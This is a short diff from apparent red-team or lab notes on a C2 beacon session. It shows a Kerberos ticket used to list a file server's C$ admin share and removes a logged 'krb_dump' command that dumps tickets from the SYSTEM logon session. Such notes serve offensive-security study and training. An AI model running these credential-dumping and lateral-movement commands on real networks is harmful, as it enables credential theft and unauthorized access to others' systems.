@@ -33,4 +33,3 @@ now we use the ticket to interact with the file server!
     beacon> ls \\lon-fs-1\c$\
         now we can!
 
-[04/30 20:50:26] beacon> krb_dump /luid:3e7 /service:cifs
